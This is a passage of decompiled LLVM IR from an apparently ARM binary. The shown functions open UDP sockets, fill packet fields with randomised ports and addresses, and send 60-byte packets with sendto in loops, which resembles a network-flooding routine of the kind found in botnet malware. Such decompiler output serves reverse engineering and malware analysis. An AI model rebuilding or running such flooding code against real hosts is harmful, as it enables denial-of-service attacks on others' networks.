  %v0_da54 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_da54, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_da60 = load i32, i32* %ip.global-to-local, align 4
  %v4_da60 = inttoptr i32 %v0_da60 to %sockaddr*
  %v7_da68 = inttoptr i32 %v0_da50 to i32*
  %v9_da68 = call i32 @sendto(i32 %v0_da54, i32* %v7_da68, i32 60, i32 16384, %sockaddr* %v4_da60, i32 16)
  %v3_da6c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_da6c, i32* %r3.global-to-local, align 4
  %v1_da70 = add i32 %v3_da6c, 1
  store i32 %v1_da70, i32* %r0.global-to-local, align 4
  %v0_da74 = load i32, i32* @sl, align 4
  %v9_da74 = icmp eq i32 %v0_da74, %v1_da70
  store i1 %v9_da74, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_da70, i32* %stack_var_-40, align 4
  %v8_da7c = icmp sgt i32 %v0_da74, %v1_da70
  br i1 %v8_da7c, label %dec_label_pc_d964, label %dec_label_pc_da80

dec_label_pc_da80:                                ; preds = %dec_label_pc_d9e0
  %v2_da80 = icmp eq i32 %v0_da74, 0
  store i1 %v2_da80, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d954.outer

dec_label_pc_da8c:                                ; preds = %dec_label_pc_d964
  %v1_da8c = add i32 %v2_d96c, 16
  %v2_da8c = inttoptr i32 %v1_da8c to i32*
  %v3_da8c = load i32, i32* %v2_da8c, align 4
  store i32 %v3_da8c, i32* %r4.global-to-local, align 4
  %v0_da90 = call i32 @function_10bd8()
  store i32 %v0_da90, i32* %r0.global-to-local, align 4
  %v3_da94 = load i32, i32* %stack_var_-40, align 4
  %v5_da9c = mul i32 %v3_da94, 24
  %v0_daa0 = load i32, i32* %r4.global-to-local, align 4
  %v1_daa4 = load i32, i32* @r8, align 4
  %v2_daa4 = add i32 %v1_daa4, %v5_da9c
  store i32 %v2_daa4, i32* %r1.global-to-local, align 4
  %v1_daa8 = and i32 %v0_daa0, ptrtoint (i32* @global_var_ff00.79 to i32)
  store i32 %v1_daa8, i32* %r3.global-to-local, align 4
  %v1_daa0 = udiv i32 %v0_daa0, 256
  %v3_daac = and i32 %v1_daa0, 65280
  store i32 %v3_daac, i32* %r2.global-to-local, align 4
  %v3_dab0 = mul i32 %v0_daa0, 16777216
  store i32 %v3_dab0, i32* %ip.global-to-local, align 4
  %v1_dab4 = add i32 %v2_daa4, 20
  %v2_dab4 = inttoptr i32 %v1_dab4 to i8*
  %v3_dab4 = load i8, i8* %v2_dab4, align 1
  %v4_dab4 = zext i8 %v3_dab4 to i32
  %v4_dab8 = mul i32 %v1_daa8, 256
  %v5_dab8 = or i32 %v4_dab8, %v3_dab0
  store i32 %v5_dab8, i32* %ip.global-to-local, align 4
  %v4_dabc = udiv i32 %v0_daa0, 16777216
  %v5_dabc = or i32 %v3_daac, %v4_dabc
  %v2_dac0 = or i32 %v5_dabc, %v5_dab8
  %v7_dac4 = lshr i32 %v0_da90, %v4_dab4
  %v8_dac4 = add i32 %v7_dac4, %v2_dac0
  store i32 %v8_dac4, i32* %r2.global-to-local, align 4
  %v3_dad0 = mul i32 %v8_dac4, 16777216
  %v1_dac8 = mul i32 %v8_dac4, 256
  %v4_dad4 = and i32 %v1_dac8, 16711680
  %v5_dad4 = or i32 %v4_dad4, %v3_dad0
  store i32 %v5_dad4, i32* %r1.global-to-local, align 4
  store i32 %v6_d624, i32* %r0.global-to-local, align 4
  %v2_dae4 = call i32 @llvm.bswap.i32(i32 %v8_dac4)
  store i32 %v2_dae4, i32* %r3.global-to-local, align 4
  store i1 %v7_d988, i1* %cpsr_z.global-to-local, align 1
  %v1_daec = load i32, i32* @r5, align 4
  %v2_daec = add i32 %v1_daec, 16
  %v3_daec = inttoptr i32 %v2_daec to i32*
  store i32 %v2_dae4, i32* %v3_daec, align 4
  br i1 %v2_d988, label %dec_label_pc_daf4, label %dec_label_pc_d990

dec_label_pc_daf4:                                ; preds = %dec_label_pc_da8c, %dec_label_pc_d984
  %v0_daf4 = call i32 @function_10bd8()
  store i32 %v0_daf4, i32* %r0.global-to-local, align 4
  store i32 %v3_d68c, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_db04, i1* %cpsr_z.global-to-local, align 1
  %v1_db08 = load i32, i32* @r5, align 4
  %v2_db08 = add i32 %v1_db08, 12
  %v3_db08 = inttoptr i32 %v2_db08 to i32*
  store i32 %v0_daf4, i32* %v3_db08, align 4
  br i1 %v3_db04, label %dec_label_pc_db10, label %dec_label_pc_daf4.dec_label_pc_d9a4_crit_edge

dec_label_pc_daf4.dec_label_pc_d9a4_crit_edge:    ; preds = %dec_label_pc_daf4
  %v1_d9a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d9a4

dec_label_pc_db10:                                ; preds = %dec_label_pc_daf4, %dec_label_pc_d990
  %v0_db10 = call i32 @function_10bd8()
  %v1_db10 = trunc i32 %v0_db10 to i8
  store i32 %v0_db10, i32* %r0.global-to-local, align 4
  %v4_db1430 = udiv i32 %v0_db10, 256
  %v1_db18 = trunc i32 %v4_db1430 to i8
  %v2_db18 = load i32, i32* @r5, align 4
  %v3_db18 = add i32 %v2_db18, 5
  %v4_db18 = inttoptr i32 %v3_db18 to i8*
  store i8 %v1_db18, i8* %v4_db18, align 1
  store i32 %v3_d690, i32* %r3.global-to-local, align 4
  %v1_db20 = load i32, i32* @r4, align 4
  %v9_db20 = icmp eq i32 %v3_d690, %v1_db20
  store i1 %v9_db20, i1* %cpsr_z.global-to-local, align 1
  %v3_db24 = load i32, i32* @r5, align 4
  %v4_db24 = add i32 %v3_db24, 4
  %v5_db24 = inttoptr i32 %v4_db24 to i8*
  store i8 %v1_db10, i8* %v5_db24, align 1
  %v0_db28 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_db28, label %dec_label_pc_db2c, label %dec_label_pc_db10.dec_label_pc_d9b0_crit_edge

dec_label_pc_db10.dec_label_pc_d9b0_crit_edge:    ; preds = %dec_label_pc_db10
  %v1_d9b4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d9b0

dec_label_pc_db2c:                                ; preds = %dec_label_pc_db10, %dec_label_pc_d9a4
  %v0_db2c = call i32 @function_10bd8()
  %v1_db2c = trunc i32 %v0_db2c to i8
  store i32 %v0_db2c, i32* %r0.global-to-local, align 4
  store i32 %v3_d694, i32* %ip.global-to-local, align 4
  %v4_db34 = sdiv i32 %v0_db2c, 256
  store i32 %v4_db34, i32* %r3.global-to-local, align 4
  %v1_db38 = load i32, i32* @r4, align 4
  %v9_db38 = icmp eq i32 %v3_d694, %v1_db38
  store i1 %v9_db38, i1* %cpsr_z.global-to-local, align 1
  %v3_db3c = load i32, i32* @r5, align 4
  %v4_db3c = add i32 %v3_db3c, 20
  %v5_db3c = inttoptr i32 %v4_db3c to i8*
  store i8 %v1_db2c, i8* %v5_db3c, align 1
  %v0_db40 = load i32, i32* %r3.global-to-local, align 4
  %v1_db40 = trunc i32 %v0_db40 to i8
  %v2_db40 = load i32, i32* @r6, align 4
  %v3_db40 = add i32 %v2_db40, 1
  %v4_db40 = inttoptr i32 %v3_db40 to i8*
  store i8 %v1_db40, i8* %v4_db40, align 1
  %v0_db44 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_db44, label %dec_label_pc_db48, label %dec_label_pc_db2c.dec_label_pc_d9bc_crit_edge

dec_label_pc_db2c.dec_label_pc_d9bc_crit_edge:    ; preds = %dec_label_pc_db2c
  %v1_d9c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d9bc

dec_label_pc_db48:                                ; preds = %dec_label_pc_db2c, %dec_label_pc_d9b0
  %v0_db48 = call i32 @function_10bd8()
  %v1_db48 = trunc i32 %v0_db48 to i8
  %v4_db4c = sdiv i32 %v0_db48, 256
  store i32 %v4_db4c, i32* %r3.global-to-local, align 4
  %v3_db50 = load i32, i32* @r6, align 4
  %v4_db50 = add i32 %v3_db50, 2
  %v5_db50 = inttoptr i32 %v4_db50 to i8*
  store i8 %v1_db48, i8* %v5_db50, align 1
  store i32 %v5_d560, i32* %r0.global-to-local, align 4
  %v1_db58 = load i32, i32* @r4, align 4
  %v9_db58 = icmp eq i32 %v5_d560, %v1_db58
  store i1 %v9_db58, i1* %cpsr_z.global-to-local, align 1
  %v0_db5c = load i32, i32* %r3.global-to-local, align 4
  %v1_db5c = trunc i32 %v0_db5c to i8
  %v2_db5c = load i32, i32* @r6, align 4
  %v3_db5c = add i32 %v2_db5c, 3
  %v4_db5c = inttoptr i32 %v3_db5c to i8*
  store i8 %v1_db5c, i8* %v4_db5c, align 1
  %v0_db60 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_db60, label %dec_label_pc_db64, label %dec_label_pc_db48.dec_label_pc_d9c8_crit_edge

dec_label_pc_db48.dec_label_pc_d9c8_crit_edge:    ; preds = %dec_label_pc_db48
  %v1_d9cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d9c8

dec_label_pc_db64:                                ; preds = %dec_label_pc_db48, %dec_label_pc_d9bc
  %v0_db64 = call i32 @function_10bd8()
  store i32 %v0_db64, i32* %r0.global-to-local, align 4
  store i32 %v6_d578, i32* %r2.global-to-local, align 4
  %v1_db6c = load i32, i32* @r4, align 4
  %v9_db6c = icmp eq i32 %v6_d578, %v1_db6c
  store i1 %v9_db6c, i1* %cpsr_z.global-to-local, align 1
  %v1_db70 = load i32, i32* @r6, align 4
  %v2_db70 = add i32 %v1_db70, 4
  %v3_db70 = inttoptr i32 %v2_db70 to i32*
  store i32 %v0_db64, i32* %v3_db70, align 4
  br i1 %v9_db6c, label %dec_label_pc_db78, label %dec_label_pc_d9d4

dec_label_pc_db78:                                ; preds = %dec_label_pc_db64, %dec_label_pc_d9c8
  %v0_db78 = call i32 @function_10bd8()
  store i32 %v0_db78, i32* %r0.global-to-local, align 4
  store i32 %v1_d698, i32* %r3.global-to-local, align 4
  store i1 %v2_db80, i1* %cpsr_z.global-to-local, align 1
  %v1_db84 = load i32, i32* @r6, align 4
  %v2_db84 = add i32 %v1_db84, 8
  %v3_db84 = inttoptr i32 %v2_db84 to i32*
  store i32 %v0_db78, i32* %v3_db84, align 4
  br i1 %v2_db80, label %dec_label_pc_d9e0, label %dec_label_pc_db8c

dec_label_pc_db8c:                                ; preds = %dec_label_pc_d9d4, %dec_label_pc_db78
  %v0_db8c = call i32 @function_10bd8()
  %v1_db8c = trunc i32 %v0_db8c to i8
  store i32 %v0_db8c, i32* %r0.global-to-local, align 4
  %v4_db90 = sdiv i32 %v0_db8c, 256
  store i32 %v4_db90, i32* %r3.global-to-local, align 4
  %v1_db94 = trunc i32 %v4_db90 to i8
  %v2_db94 = load i32, i32* @r6, align 4
  %v3_db94 = add i32 %v2_db94, 19
  %v4_db94 = inttoptr i32 %v3_db94 to i8*
  store i8 %v1_db94, i8* %v4_db94, align 1
  %v3_db98 = load i32, i32* @r6, align 4
  %v4_db98 = add i32 %v3_db98, 18
  %v5_db98 = inttoptr i32 %v4_db98 to i8*
  store i8 %v1_db8c, i8* %v5_db98, align 1
  br label %dec_label_pc_d9e0

dec_label_pc_dba0:                                ; preds = %dec_label_pc_d648
  %v0_dba0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_dba0, i32* %r0.global-to-local, align 4
  %v1_dba4 = call i32 @close(i32 %v0_dba0)
  store i32 %v1_dba4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dba8

dec_label_pc_dba8:                                ; preds = %dec_label_pc_d470, %dec_label_pc_dba0
  %v29_dbac = phi i32 [ %v3_d638, %dec_label_pc_d470 ], [ %v1_dba4, %dec_label_pc_dba0 ]
  store i32 %v3_d470, i32* %r4.global-to-local, align 4
  store i32 %v6_d470, i32* %r5.global-to-local, align 4
  store i32 %v9_d470, i32* %r6.global-to-local, align 4
  store i32 %v12_d470, i32* %r7.global-to-local, align 4
  ret i32 %v29_dbac

; uselistorder directives
  uselistorder i32 %v4_db90, { 1, 0 }
  uselistorder i32 %v0_db8c, { 0, 2, 1 }
  uselistorder i32 %v0_db2c, { 0, 2, 1 }
  uselistorder i32 %v0_db10, { 0, 2, 1 }
  uselistorder i32 %v2_dae4, { 1, 0 }
  uselistorder i32 %v8_dac4, { 2, 0, 1, 3 }
  uselistorder i32 %v3_dab0, { 1, 0 }
  uselistorder i32 %v0_daa0, { 1, 0, 2, 3 }
  uselistorder i1 %v2_da80, { 1, 0 }
  uselistorder i32 %v0_da74, { 1, 2, 3, 0 }
  uselistorder i32 %v1_da70, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_da18, { 0, 2, 1 }
  uselistorder i32 %v0_da00, { 1, 0, 2 }
  uselistorder i1 %v7_d988, { 2, 1, 0 }
  uselistorder i1 %v2_db80, { 2, 3, 1, 0 }
  uselistorder i1 %v3_db04, { 1, 0, 2, 3 }
  uselistorder i32 %v1_d93c, { 1, 0, 2, 3 }
  uselistorder i8 %v5_d754, { 1, 0 }
  uselistorder i32 %v1_d734, { 1, 0 }
  uselistorder i32 %v1_d724, { 1, 0 }
  uselistorder i32 %v1_d720, { 1, 0 }
  uselistorder i32 %v1_d71c, { 1, 0 }
  uselistorder i32 %v3_d70c, { 1, 0 }
  uselistorder i32 %v1_d6fc, { 1, 0 }
  uselistorder i32 %v1_d6f4, { 1, 0 }
  uselistorder i32 %v1_d6d0, { 1, 0 }
  uselistorder i32 %v1_d6c4, { 1, 0 }
  uselistorder i32 %v1_d698, { 2, 1, 3, 0 }
  uselistorder i32 %v3_d68c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_d688, { 4, 0, 1, 3, 2 }
  uselistorder i32 %v0_d684, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_d668, { 1, 0 }
  uselistorder i1 %v7_d63c, { 1, 0 }
  uselistorder i32 %v3_d638, { 1, 2, 0, 3 }
  uselistorder i32 %v6_d624, { 6, 4, 0, 5, 1, 3, 2 }
  uselistorder i32 %v6_d578, { 3, 2, 1, 0 }
  uselistorder i32 %v5_d560, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_d510, { 1, 0 }
  uselistorder i32 %v5_d4a8, { 1, 0 }
  uselistorder i32 %v1_d474, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 31, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 33, 34, 35 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 6, 7, 5, 8, 9, 11, 10, 13, 12, 14, 16, 15, 17, 18, 19, 22, 20, 21, 23, 24, 25, 26, 27, 1, 28, 29, 30, 31, 35, 32, 33, 34, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32 10240, { 0, 6, 2, 7, 5, 8, 3, 9, 4, 10, 1, 11 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 44, { 3, 4, 5, 6, 1, 7, 0, 8, 2, 9 }
  uselistorder i32 45, { 2, 0, 3, 1, 4 }
  uselistorder i32 46, { 2, 0, 3, 1, 4 }
  uselistorder i32 42, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_dba8, { 1, 0 }
  uselistorder label %dec_label_pc_db8c, { 1, 0 }
  uselistorder label %dec_label_pc_d9e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d954, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_dbb4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_dbb4:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-80 = alloca i8, align 1
  %v3_dbb4 = load i32, i32* @r4, align 4
  %v6_dbb4 = load i32, i32* @r5, align 4
  %v24_dbb4 = load i32, i32* @fp, align 4
  %v1_dbb8 = urem i32 %arg1, 256
  store i32 %v1_dbb8, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_dbd0 = urem i32 %arg3, 256
  store i32 %v1_dbd0, i32* @r4, align 4
  %v2_dbd4 = call i32 @_calloc(i32 %v1_dbb8, i32 4)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v2_dbd4, i32* @sl, align 4
  %v0_dbe0 = load i32, i32* @r7, align 4
  %v2_dbe4 = call i32 @_calloc(i32 %v0_dbe0, i32 4)
  store i32 65535, i32* @r5, align 4
  %v0_dbf0 = load i32, i32* @r6, align 4
  store i32 %v0_dbf0, i32* %r1.global-to-local, align 4
  store i32 %v2_dbe4, i32* @sb, align 4
  %v0_dc00 = load i32, i32* @r4, align 4
  %v4_dc04 = inttoptr i32 %v0_dbf0 to i32*
  %v5_dc04 = call i32 @function_b240(i32 %v0_dc00, i32* %v4_dc04, i32 7, i32 65535)
  %v3_dc0c = urem i32 %v5_dc04, 65536
  %v0_dc10 = load i32, i32* @r6, align 4
  store i32 %v0_dc10, i32* %r1.global-to-local, align 4
  %v0_dc18 = load i32, i32* @r5, align 4
  %v0_dc1c = load i32, i32* @r4, align 4
  %v5_dc24 = inttoptr i32 %v0_dc10 to i32*
  %v6_dc24 = call i32 @function_b240(i32 %v0_dc1c, i32* %v5_dc24, i32 6, i32 %v0_dc18)
  %v0_dc28 = load i32, i32* @r6, align 4
  store i32 %v0_dc28, i32* %r1.global-to-local, align 4
  %v3_dc2c = mul i32 %v6_dc24, 65536
  store i32 %v3_dc2c, i32* %fp.global-to-local, align 4
  %v0_dc38 = load i32, i32* @r4, align 4
  %v4_dc3c = inttoptr i32 %v0_dc28 to i32*
  %v5_dc3c = call i32 @function_b240(i32 %v0_dc38, i32* %v4_dc3c, i32 0, i32 512)
  %v0_dc48 = load i32, i32* @r6, align 4
  store i32 %v0_dc48, i32* %r1.global-to-local, align 4
  %v0_dc4c = load i32, i32* @r4, align 4
  %v3_dc54 = urem i32 %v5_dc3c, 65536
  store i32 %v3_dc54, i32* @r6, align 4
  %v4_dc58 = inttoptr i32 %v0_dc48 to i32*
  %v5_dc58 = call i32 @function_b240(i32 %v0_dc4c, i32* %v4_dc58, i32 1, i32 1)
  %v0_dc5c = load i32, i32* %fp.global-to-local, align 4
  %v3_dc5c = udiv i32 %v0_dc5c, 65536
  store i32 %v3_dc5c, i32* %r4.global-to-local, align 4
  %v1_dc64 = load i32, i32* @r5, align 4
  %v9_dc64 = icmp eq i32 %v3_dc5c, %v1_dc64
  store i32 0, i32* %stack_var_-52, align 4
  br i1 %v9_dc64, label %dec_label_pc_dc8c, label %bb

bb:                                               ; preds = %dec_label_pc_dbb4
  %v2_dc78 = mul nuw nsw i32 %v3_dc5c, 256
  %v4_dc7c = and i32 %v2_dc78, 65280
  %v1_dc80 = urem i32 %v5_dc58, 256
  store i32 %v1_dc80, i32* @r8, align 4
  %v5_dc84 = udiv i32 %v0_dc5c, 16777216
  %v6_dc84 = or i32 %v4_dc7c, %v5_dc84
  br label %dec_label_pc_dc98

dec_label_pc_dc8c:                                ; preds = %dec_label_pc_dbb4
  %v1_dc807 = urem i32 %v5_dc58, 256
  store i32 %v1_dc807, i32* @r8, align 4
  %v0_dc8c = call i32 @function_10bd8()
  %v3_dc94 = urem i32 %v0_dc8c, 65536
  br label %dec_label_pc_dc98

dec_label_pc_dc98:                                ; preds = %bb, %dec_label_pc_dc8c
  %storemerge17 = phi i32 [ %v6_dc84, %bb ], [ %v3_dc94, %dec_label_pc_dc8c ]
  store i32 %storemerge17, i32* %fp.global-to-local, align 4
  %v0_dc98 = load i32, i32* @r7, align 4
  %tmp41 = icmp slt i32 %v0_dc98, 1
  br i1 %tmp41, label %dec_label_pc_de44.preheader, label %dec_label_pc_dca0

dec_label_pc_de44.preheader:                      ; preds = %dec_label_pc_dda0, %dec_label_pc_dc98
  %storemerge3.in12.ph = phi i32 [ %v0_dc98, %dec_label_pc_dc98 ], [ %v1_dcf4, %dec_label_pc_dda0 ]
  %tmp424750 = icmp slt i32 %storemerge3.in12.ph, 1
  br i1 %tmp424750, label %dec_label_pc_de0c, label %dec_label_pc_de10.lr.ph

dec_label_pc_dca0:                                ; preds = %dec_label_pc_dc98
  store i32 %v3_dc0c, i32* %r1.global-to-local, align 4
  %v3_dca4 = udiv i32 %v5_dc04, 256
  %v5_dcb0 = trunc i32 %v3_dca4 to i8
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v3_dcc8 = udiv i32 %v5_dc04, 65536
  %v4_dcd8 = trunc i32 %v3_dcc8 to i8
  store i8 %v4_dcd8, i8* %stack_var_-80, align 1
  %v3_ddec = icmp eq i32 %v3_dc0c, 65535
  %v2_dd10 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_ddd0

dec_label_pc_dce0:                                ; preds = %dec_label_pc_ddd0
  %v2_dce0 = load i8, i8* %stack_var_-80, align 1
  %v3_dce0 = sext i8 %v2_dce0 to i32
  store i32 %v3_dce0, i32* %r1.global-to-local, align 4
  %v2_dce4 = load i32, i32* %r5.global-to-local, align 4
  %v3_dce4 = add i32 %v2_dce4, 2
  %v4_dce4 = inttoptr i32 %v3_dce4 to i8*
  store i8 %v5_dcb0, i8* %v4_dce4, align 1
  %v0_dce8 = load i32, i32* %r1.global-to-local, align 4
  %v1_dce8 = trunc i32 %v0_dce8 to i8
  %v2_dce8 = load i32, i32* %r5.global-to-local, align 4
  %v3_dce8 = add i32 %v2_dce8, 3
  %v4_dce8 = inttoptr i32 %v3_dce8 to i8*
  store i8 %v1_dce8, i8* %v4_dce8, align 1
  br label %dec_label_pc_dcec

dec_label_pc_dcec:                                ; preds = %dec_label_pc_ddf8, %dec_label_pc_dce0
  %v1_dcf4 = add i32 %stack_var_-56.0, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_dd04 = call i32 @_socket(i32 2, i32 2, i32 17)
  %v7_dd0c = icmp eq i32 %v3_dd04, -1
  store i32 %v2_dd10, i32* %r1.global-to-local, align 4
  %v2_dd1c = load i32, i32* @sb, align 4
  %v3_dd1c = add i32 %v2_dd1c, %stack_var_-60.0
  %v4_dd1c = inttoptr i32 %v3_dd1c to i32*
  store i32 %v3_dd04, i32* %v4_dd1c, align 4
  br i1 %v7_dd0c, label %dec_label_pc_de50, label %dec_label_pc_dd24

dec_label_pc_dd24:                                ; preds = %dec_label_pc_dcec
  store i32 2, i32* %stack_var_-52, align 4
  %v0_dd44 = call i32 @_bind()
  %v0_dd48 = load i32, i32* %r5.global-to-local, align 4
  %v1_dd48 = add i32 %v0_dd48, 20
  %v2_dd48 = inttoptr i32 %v1_dd48 to i8*
  %v3_dd48 = load i8, i8* %v2_dd48, align 1
  %tmp = icmp ugt i8 %v3_dd48, 31
  br i1 %tmp, label %dec_label_pc_dda0, label %dec_label_pc_dd54

dec_label_pc_dd54:                                ; preds = %dec_label_pc_dd24
  %v1_dd54 = add i32 %v0_dd48, 16
  %v2_dd54 = inttoptr i32 %v1_dd54 to i32*
  %v3_dd54 = load i32, i32* %v2_dd54, align 4
  store i32 %v3_dd54, i32* %r4.global-to-local, align 4
  %v0_dd58 = call i32 @function_10bd8()
  %v1_dd60 = and i32 %v3_dd54, ptrtoint (i32* @global_var_ff00.79 to i32)
  %v1_dd5c = udiv i32 %v3_dd54, 256
  %v3_dd64 = and i32 %v1_dd5c, 65280
  %v3_dd68 = mul i32 %v3_dd54, 16777216
  %v4_dd6c = mul i32 %v1_dd60, 256
  %v5_dd6c = or i32 %v4_dd6c, %v3_dd68
  store i32 %v5_dd6c, i32* %r1.global-to-local, align 4
  %v4_dd70 = udiv i32 %v3_dd54, 16777216
  %v5_dd70 = or i32 %v3_dd64, %v4_dd70
  %v0_dd74 = load i32, i32* %r5.global-to-local, align 4
  %v1_dd74 = add i32 %v0_dd74, 20
  %v2_dd74 = inttoptr i32 %v1_dd74 to i8*
  %v3_dd74 = load i8, i8* %v2_dd74, align 1
  %v4_dd74 = zext i8 %v3_dd74 to i32
  %v2_dd78 = or i32 %v5_dd6c, %v5_dd70
  %v7_dd7c = lshr i32 %v0_dd58, %v4_dd74
  %v8_dd7c = add i32 %v7_dd7c, %v2_dd78
  %v3_dd88 = mul i32 %v8_dd7c, 16777216
  %v1_dd8c = and i32 %v8_dd7c, 65280
  %v4_dd90 = mul nuw nsw i32 %v1_dd8c, 256
  %v5_dd90 = or i32 %v4_dd90, %v3_dd88
  store i32 %v5_dd90, i32* %r1.global-to-local, align 4
  %v2_dd98 = call i32 @llvm.bswap.i32(i32 %v8_dd7c)
  %v2_dd9c = add i32 %v0_dd74, 4
  %v3_dd9c = inttoptr i32 %v2_dd9c to i32*
  store i32 %v2_dd98, i32* %v3_dd9c, align 4
  %v0_ddac.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_dda0

dec_label_pc_dda0:                                ; preds = %dec_label_pc_dd24, %dec_label_pc_dd54
  %v0_ddac = phi i32 [ %v0_dd48, %dec_label_pc_dd24 ], [ %v0_ddac.pre, %dec_label_pc_dd54 ]
  store i32 %stack_var_-60.0, i32* %r1.global-to-local, align 4
  %v1_dda8 = load i32, i32* @sb, align 4
  %v2_dda8 = add i32 %v1_dda8, %stack_var_-60.0
  %v3_dda8 = inttoptr i32 %v2_dda8 to i32*
  %v4_dda8 = load i32, i32* %v3_dda8, align 4
  store i32 %v4_dda8, i32* @r0, align 4
  store i32 %v0_ddac, i32* @r1, align 4
  %v3_ddb0 = call i32 @_connect(i32 %v4_dda8, i32 %v0_ddac, i32 16)
  %v1_ddbc = add i32 %stack_var_-60.0, 4
  %v1_ddc0 = load i32, i32* @r7, align 4
  %v9_ddc0 = icmp eq i32 %v1_dcf4, %v1_ddc0
  %v0_ddc8 = load i32, i32* %r5.global-to-local, align 4
  %v1_ddc8 = add i32 %v0_ddc8, 24
  store i32 %v1_ddc8, i32* %r5.global-to-local, align 4
  br i1 %v9_ddc0, label %dec_label_pc_de44.preheader, label %dec_label_pc_ddd0

dec_label_pc_ddd0:                                ; preds = %dec_label_pc_dda0, %dec_label_pc_dca0
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_dca0 ], [ %v1_ddbc, %dec_label_pc_dda0 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_dca0 ], [ %v1_dcf4, %dec_label_pc_dda0 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_dddc = call i32 @_calloc(i32 65535, i32 1)
  store i32 %v3_dc0c, i32* %r1.global-to-local, align 4
  %v2_ddf0 = load i32, i32* @sl, align 4
  %v3_ddf0 = add i32 %v2_ddf0, %stack_var_-60.0
  %v4_ddf0 = inttoptr i32 %v3_ddf0 to i32*
  store i32 %v2_dddc, i32* %v4_ddf0, align 4
  br i1 %v3_ddec, label %dec_label_pc_ddf8, label %dec_label_pc_dce0

dec_label_pc_ddf8:                                ; preds = %dec_label_pc_ddd0
  %v0_ddf8 = call i32 @function_10bd8()
  %v1_ddf8 = trunc i32 %v0_ddf8 to i8
  %v4_ddfc = sdiv i32 %v0_ddf8, 256
  %v1_de00 = trunc i32 %v4_ddfc to i8
  %v2_de00 = load i32, i32* %r5.global-to-local, align 4
  %v3_de00 = add i32 %v2_de00, 3
  %v4_de00 = inttoptr i32 %v3_de00 to i8*
  store i8 %v1_de00, i8* %v4_de00, align 1
  %v3_de04 = load i32, i32* %r5.global-to-local, align 4
  %v4_de04 = add i32 %v3_de04, 2
  %v5_de04 = inttoptr i32 %v4_de04 to i8*
  store i8 %v1_ddf8, i8* %v5_de04, align 1
  br label %dec_label_pc_dcec

dec_label_pc_de0c:                                ; preds = %dec_label_pc_de44.loopexit, %dec_label_pc_de44.preheader, %dec_label_pc_de48.loopexit, %dec_label_pc_de0c
  br label %dec_label_pc_de0c

dec_label_pc_de10:                                ; preds = %dec_label_pc_de10.lr.ph, %dec_label_pc_de48.loopexit
  %v0_de10 = load i32, i32* @r8, align 4
  %v2_de10 = icmp eq i32 %v0_de10, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_de10, label %dec_label_pc_de18, label %dec_label_pc_de58

